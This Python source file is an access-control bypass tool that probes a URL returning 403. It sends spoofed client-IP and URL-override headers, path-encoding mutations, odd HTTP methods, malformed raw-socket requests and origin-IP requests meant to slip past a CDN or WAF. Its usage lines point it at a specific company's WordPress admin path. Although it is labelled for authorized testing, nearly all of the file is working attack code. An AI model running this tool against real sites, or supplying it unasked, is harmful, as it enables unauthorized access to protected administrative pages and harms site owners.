#!/usr/bin/env python3
"""
Advanced 403 Bypass Testing Tool - v2
For AUTHORIZED security testing only.

Usage:
    python3 bypass403.py -u https://pathao.com/np/wp-admin/ --delay 0.3
    python3 bypass403.py -u https://pathao.com/np/wp-admin/ --origin-ip 1.2.3.4
    python3 bypass403.py -u https://pathao.com/np/wp-admin/ --save report.json
"""

import argparse
import hashlib
import json
import socket
import ssl
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote, urlunparse, urlencode

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------- COLORS ----------
G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"
C = "\033[96m"; B = "\033[94m"; M = "\033[95m"; X = "\033[0m"

BANNER = f"""{C}
╔══════════════════════════════════════════════════════╗
║       ADVANCED 403 BYPASS TOOL  v2.0                 ║
║       Authorized Testing Only                        ║
╚══════════════════════════════════════════════════════╝{X}
"""


# ═══════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════

def parse_url(url):
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    p = urlparse(url)
    return {
        "full": url,
        "scheme": p.scheme,
        "host": p.netloc,
        "hostname": p.hostname,
        "port": p.port or (443 if p.scheme == "https" else 80),
        "path": p.path or "/",
        "query": ("?" + p.query) if p.query else "",
    }


def body_hash(resp):
    return hashlib.md5(resp.content).hexdigest()[:8]


def send(url, method="GET", headers=None, data=None, allow_redirects=False,
         timeout=10, proxies=None):
    try:
        return requests.request(
            method=method, url=url, headers=headers or {}, data=data,
            allow_redirects=allow_redirects, verify=False,
            timeout=timeout, proxies=proxies,
        )
    except Exception:
        return None


# ═══════════════════════════════════════════════════════════
#  TECHNIQUE GENERATORS
# ═══════════════════════════════════════════════════════════

def techniques_headers(u):
    """Header-based bypasses (proxy trust, IP spoofing, URL override)."""
    tests = []
    fake_ips = ["127.0.0.1", "localhost", "0.0.0.0", "::1", "10.0.0.1",
                "192.168.1.1", "172.16.0.1", "8.8.8.8"]

    ip_headers = [
        "X-Forwarded-For", "X-Forwarded", "Forwarded-For", "Forwarded",
        "X-Client-IP", "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
        "X-Remote-Addr", "X-ProxyUser-Ip", "X-Original-Remote-Addr",
        "Client-IP", "True-Client-IP", "Cluster-Client-IP",
        "X-Custom-IP-Authorization", "X-Forwarded-For-Original",
        "CF-Connecting-IP", "Fastly-Client-IP", "X-Azure-ClientIP",
    ]
    for h in ip_headers:
        for ip in fake_ips[:3]:  # keep small
            tests.append({
                "name": f"{h}: {ip}",
                "url": u["full"], "method": "GET", "headers": {h: ip},
            })

    url_headers = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
                   "X-Forwarded-Path", "X-Original-Path", "X-Forwarded-Uri",
                   "X-Original-URI", "X-Request-URI", "X-Rewrite-Url"]
    for h in url_headers:
        tests.append({
            "name": f"{h}: {u['path']}",
            "url": u["full"], "method": "GET", "headers": {h: u["path"]},
        })

    # Override via root request + path in header
    root = f"{u['scheme']}://{u['host']}/"
    for h in ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
              "X-Forwarded-Path", "X-Original-Path"]:
        tests.append({
            "name": f"{h} override (root)",
            "url": root, "method": "GET", "headers": {h: u["path"]},
        })

    # Header case variations
    tests.append({
        "name": "x-forwarded-for lowercase",
        "url": u["full"], "method": "GET",
        "headers": {"x-forwarded-for": "127.0.0.1"},
    })
    tests.append({
        "name": "X-FORWARDED-FOR uppercase",
        "url": u["full"], "method": "GET",
        "headers": {"X-FORWARDED-FOR": "127.0.0.1"},
    })

    # Host header manipulation
    tests.append({
        "name": "Host: localhost",
        "url": u["full"], "method": "GET",
        "headers": {"Host": "localhost"},
    })
    tests.append({
        "name": "Host: 127.0.0.1",
        "url": u["full"], "method": "GET",
        "headers": {"Host": "127.0.0.1"},
    })

    # Referer tricks
    tests.append({
        "name": "Referer: target itself",
        "url": u["full"], "method": "GET",
        "headers": {"Referer": u["full"]},
    })

    # Content-Type trick
    tests.append({
        "name": "Content-Type: application/json",
        "url": u["full"], "method": "GET",
        "headers": {"Content-Type": "application/json"},
    })

    return tests


def techniques_path(u):
    """Path normalization / parser confusion tricks."""
    tests = []
    base = f"{u['scheme']}://{u['host']}"
    path = u["path"].rstrip("/") or ""

    raw_mutations = [
        ("trailing slash",                f"{path}/"),
        ("double slash",                  f"{path}//"),
        ("triple slash",                  f"{path}///"),
        ("trailing dot",                  f"{path}/."),
        ("trailing dot no slash",         f"{path}."),
        ("dot-slash",                     f"{path}/./"),
        ("..;/",                          f"{path}/..;/"),
        ("/.;/",                          f"{path}/.;/"),
        ("/%2e/",                         f"{path}/%2e/"),
        ("/%2e%2e/",                      f"{path}/%2e%2e/"),
        ("/..%2f",                        f"{path}/..%2f"),
        ("/%252e%252e/",                  f"{path}/%252e%252e/"),
        ("trailing %20",                  f"{path}%20"),
        ("trailing %09 (tab)",            f"{path}%09"),
        ("trailing %0a (LF)",             f"{path}%0a"),
        ("trailing %0d (CR)",             f"{path}%0d"),
        ("trailing %00",                  f"{path}%00"),
        ("trailing ?",                    f"{path}?"),
        ("trailing ??",                   f"{path}??"),
        ("trailing #",                    f"{path}#"),
        ("trailing #frag",                f"{path}#x"),
        ("trailing ?.css",                f"{path}?.css"),
        ("trailing ?.js",                 f"{path}?.js"),
        ("trailing ?.html",               f"{path}?.html"),
        ("trailing ?_=",                  f"{path}?_="),
        ("trailing .json",                f"{path}.json"),
        ("trailing .html",                f"{path}.html"),
        ("trailing .css",                 f"{path}.css"),
        ("trailing .bak",                 f"{path}.bak"),
        ("trailing .old",                 f"{path}.old"),
        ("trailing .zip",                 f"{path}.zip"),
        ("trailing ;/",                   f"{path};/"),
        ("trailing ;",                    f"{path};"),
        ("semicolon segment",             f"{path}/;/"),
        ("UPPERCASE whole",               path.upper() or "/"),
        ("lowercase whole",               path.lower() or "/"),
        ("trailing slash + dot",          f"{path}/."),
        ("slash-encode one",              path.replace("/", "%2f", 1) or "/"),
        ("double-encode slash",           path.replace("/", "%252f", 1) or "/"),
        ("backslash",                     f"{path}\\"),
        ("trailing backslash",            f"{path}/\\"),
        ("mixed case segment",            "/".join(s.capitalize() for s in path.split("/")) or "/"),
    ]

    seen = set()
    for name, m in raw_mutations:
        full = base + m
        if full not in seen:
            seen.add(full)
            tests.append({"name": name, "url": full, "method": "GET", "headers": {}})

    # Path with query preservation
    if u["query"]:
        tests.append({
            "name": "path + query preserved",
            "url": u["full"], "method": "GET", "headers": {},
        })

    return tests


def techniques_methods(u):
    tests = []
    methods = ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD",
               "TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL",
               "COPY", "MOVE", "LOCK", "UNLOCK", "FOO", "DEBUG",
               "TRACK", "SEARCH", "REPORT", "PURGE"]
    for m in methods:
        tests.append({"name": f"method {m}", "url": u["full"],
                      "method": m, "headers": {}})
    return tests


def techniques_protocol(u):
    """Raw HTTP/1.0 and malformed-request tricks via socket."""
    tests = []
    host = u["hostname"]
    port = u["port"]
    path = u["path"]
    is_ssl = u["scheme"] == "https"

    raw_payloads = [
        ("HTTP/1.0 without Host header",
         f"GET {path} HTTP/1.0\r\n\r\n"),
        ("HTTP/0.9 request",
         f"GET {path}\r\n\r\n"),
        ("HTTP/1.1 with space in path",
         f"GET {path}  HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 with tab in path",
         f"GET {path}\t HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 double Host",
         f"GET {path} HTTP/1.1\r\nHost: {host}\r\nHost: localhost\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 X-Forwarded-For raw",
         f"GET {path} HTTP/1.1\r\nHost: {host}\r\nX-Forwarded-For: 127.0.0.1\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 absolute URI",
         f"GET http://{host}{path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"),
        ("HTTP/1.1 path with ..;/",
         f"GET {path}/..;/ HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"),
    ]

    for name, payload in raw_payloads:
        tests.append({
            "name": f"raw: {name}",
            "raw": payload, "host": host, "port": port, "ssl": is_ssl,
        })

    return tests


# ═══════════════════════════════════════════════════════════
#  RAW SOCKET REQUEST
# ═══════════════════════════════════════════════════════════

def raw_request(host, port, is_ssl, payload, timeout=10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        if is_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(payload.encode())
        data = b""
        while True:
            try:
                chunk = s.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
            if len(data) > 131072:
                break
        s.close()
        return data
    except Exception:
        return None


def parse_raw_status(data):
    if not data:
        return None, 0
    try:
        first_line = data.split(b"\r\n", 1)[0].decode("latin1", "ignore")
        parts = first_line.split(" ", 2)
        if len(parts) >= 2 and parts[1].isdigit():
            return int(parts[1]), len(data)
    except Exception:
        pass
    return None, len(data)


# ═══════════════════════════════════════════════════════════
#  ORIGIN-IP BYPASS
# ═══════════════════════════════════════════════════════════

def test_origin_ip(origin_ip, u, vhost):
    """Request via origin IP but with original Host header (bypasses CF)."""
    scheme = u["scheme"]
    url = f"{scheme}://{origin_ip}{u['path']}{u['query']}"
    headers = {"Host": vhost}
    try:
        r = requests.get(url, headers=headers, verify=False,
                         allow_redirects=False, timeout=10)
        return r
    except Exception:
        return None


# ═══════════════════════════════════════════════════════════
#  ENGINE
# ═══════════════════════════════════════════════════════════

def classify(resp, baseline_status, baseline_hash, baseline_len):
    if resp is None:
        return None, "err"
    code = resp.status_code
    h = body_hash(resp)
    ln = len(resp.content)

    if code in (200, 201, 202, 203, 204):
        # Check if body differs from baseline (important!)
        if h != baseline_hash:
            return code, "🎯 BYPASS?"
        return code, "200-same"
    if code in (301, 302, 303, 307, 308):
        return code, "redirect"
    if code == 401:
        return code, "401"
    if code == 403:
        if h != baseline_hash:
            return code, "403-diff"
        return code, "403-same"
    if code == 404:
        return code, "404"
    if code == 405:
        return code, "405"
    if code == 400:
        return code, "400"
    if code >= 500:
        return code, "5xx"
    return code, "other"


def run_all(u, delay=0.0, origin_ips=None, threads=1, verbose=False):
    print(BANNER)
    print(f"{B}[*] Target:{X} {u['full']}")
    print(f"{B}[*] Delay:{X} {delay}s")

    # Baseline
    base = send(u["full"])
    if base is None:
        print(f"{R}[!] Cannot reach target. Aborting.{X}")
        sys.exit(1)
    base_status = base.status_code
    base_hash = body_hash(base)
    base_len = len(base.content)
    print(f"{B}[*] Baseline:{X} {base_status} | "
          f"{base_len} bytes | hash={base_hash}")

    if base_status not in (401, 402, 403):
        print(f"{Y}[!] Baseline is {base_status} — this tool is designed for 401/403. "
              f"Results may be misleading.{X}")

    # Build test list
    tests = []
    tests += techniques_headers(u)
    tests += techniques_path(u)
    tests += techniques_methods(u)
    tests += techniques_protocol(u)

    print(f"{B}[*] Loaded {len(tests)} tests.{X}")
    print(f"{C}{'─' * 78}{X}")

    findings = []
    seen_interesting = set()

    for i, t in enumerate(tests, 1):
        name = t["name"]

        # RAW socket test
        if "raw" in t:
            data = raw_request(t["host"], t["port"], t["ssl"], t["raw"])
            code, ln = parse_raw_status(data)
            if code is None:
                print(f"{C}[{i:>3}/{len(tests)}]{X} {name:<45} {R}FAILED{X}")
                continue
            # Compute "hash" of raw response for diff detection
            raw_hash = hashlib.md5(data).hexdigest()[:8] if data else "0"
            interesting = code in (200, 201, 202, 301, 302) and raw_hash != base_hash
            color = G if interesting else R
            tag = "🎯 BYPASS?" if interesting else "raw"
            print(f"{C}[{i:>3}/{len(tests)}]{X} {name:<45} "
                  f"{color}{code}{X} ({ln}b) hash={raw_hash} {tag}")
            if interesting:
                findings.append({
                    "technique": name, "type": "raw-socket",
                    "payload": t["raw"].replace("\r\n", "\\r\\n"),
                    "status": code, "length": ln, "hash": raw_hash,
                })
        else:
            # Standard HTTP request
            resp = send(t["url"], method=t.get("method", "GET"),
                        headers=t.get("headers"))
            code, verdict = classify(resp, base_status, base_hash, base_len)

            if resp is None:
                print(f"{C}[{i:>3}/{len(tests)}]{X} {name:<45} {R}FAILED{X}")
                continue

            h = body_hash(resp)
            ln = len(resp.content)

            # Only flag as interesting if response differs from baseline
            interesting = verdict in ("🎯 BYPASS?", "403-diff") or \
                          (code in (200, 201, 202) and h != base_hash)

            color = G if interesting else R
            marker = "🎯" if interesting else "  "
            print(f"{C}[{i:>3}/{len(tests)}]{X} {marker} {name:<43} "
                  f"{color}{code}{X} ({ln}b) hash={h} {verdict}")

            if interesting:
                key = (code, h)
                if key not in seen_interesting:
                    seen_interesting.add(key)
                    findings.append({
                        "technique": name,
                        "type": "http",
                        "url": t.get("url"),
                        "method": t.get("method", "GET"),
                        "headers": t.get("headers", {}),
                        "status": code, "length": ln, "hash": h,
                        "verdict": verdict,
                    })

        if delay:
            time.sleep(delay)

    # ---------- ORIGIN IP TEST ----------
    if origin_ips:
        print(f"\n{C}{'─' * 78}{X}")
        print(f"{B}[*] Testing origin IPs (bypassing CDN/WAF):{X}")
        for ip in origin_ips:
            print(f"{C}[*]{X} Origin: {ip}")
            for vhost in (u["hostname"], u["host"]):
                resp = test_origin_ip(ip, u, vhost)
                if resp is None:
                    print(f"    {R}FAILED{X} (Host: {vhost})")
                    continue
                code, verdict = classify(resp, base_status, base_hash, base_len)
                h = body_hash(resp)
                ln = len(resp.content)
                interesting = code in (200, 201, 202) or verdict == "403-diff"
                color = G if interesting else R
                print(f"    {color}{code}{X} ({ln}b) hash={h} "
                      f"Host={vhost} — {verdict}")
                if interesting:
                    findings.append({
                        "technique": f"origin-ip {ip} (Host: {vhost})",
                        "type": "origin-ip",
                        "url": f"{u['scheme']}://{ip}{u['path']}",
                        "headers": {"Host": vhost},
                        "status": code, "length": ln, "hash": h,
                    })

    # ---------- SUMMARY ----------
    print(f"\n{C}{'═' * 78}{X}")
    print(f"{B}                        SUMMARY{X}")
    print(f"{C}{'═' * 78}{X}")
    print(f"{B}[*] Baseline:{X} {base_status} ({base_len}b) hash={base_hash}")
    print(f"{B}[*] Tests run:{X} {len(tests)}")

    if not findings:
        print(f"\n{R}[x] No bypass found.{X}")
        print(f"{Y}[i] This usually means the 403 is a hard nginx/apache "
              f"deny rule with no header trust.{X}")
        print(f"{Y}[i] Next steps:{X}")
        print(f"    1. Try origin IP enumeration (--origin-ip)")
        print(f"    2. Check adjacent endpoints (/wp-json/, /xmlrpc.php)")
        print(f"    3. Pivot to a different attack surface entirely")
    else:
        print(f"\n{G}[+] {len(findings)} interesting response(s):{X}\n")
        for f in findings:
            print(f"{G}  ► {f['technique']}{X}")
            if "url" in f:
                print(f"      URL:      {f['url']}")
            if "method" in f:
                print(f"      Method:   {f['method']}")
            if f.get("headers"):
                print(f"      Headers:  {f['headers']}")
            if "payload" in f:
                print(f"      Raw:      {f['payload'][:80]}...")
            print(f"      Status:   {f['status']} ({f['length']}b) hash={f['hash']}")
            print()

    return {
        "target": u["full"],
        "baseline": {"status": base_status, "length": base_len, "hash": base_hash},
        "findings": findings,
        "total_tests": len(tests),
    }


# ═══════════════════════════════════════════════════════════
#  CLI
# ═══════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(
        description="Advanced 403 Bypass Testing Tool (authorized only)"
    )
    ap.add_argument("-u", "--url", required=True, help="Target URL")
    ap.add_argument("--delay", type=float, default=0.0,
                    help="Delay between requests (recommended: 0.3)")
    ap.add_argument("--origin-ip", action="append", default=[],
                    help="Origin IP(s) to test (bypass CDN). Can repeat.")
    ap.add_argument("--save", help="Save JSON report to this path")
    ap.add_argument("--threads", type=int, default=1,
                    help="Threads (default 1 — safer)")
    ap.add_argument("--only", choices=["headers", "paths", "methods", "protocol"],
                    help="Run only one category")

    args = ap.parse_args()

    u = parse_url(args.url)
    result = run_all(
        u,
        delay=args.delay,
        origin_ips=args.origin_ip,
        threads=args.threads,
    )

    if args.save:
        with open(args.save, "w") as f:
            json.dump(result, f, indent=2)
        print(f"{G}[+] Report saved to {args.save}{X}")


if __name__ == "__main__":
    main()
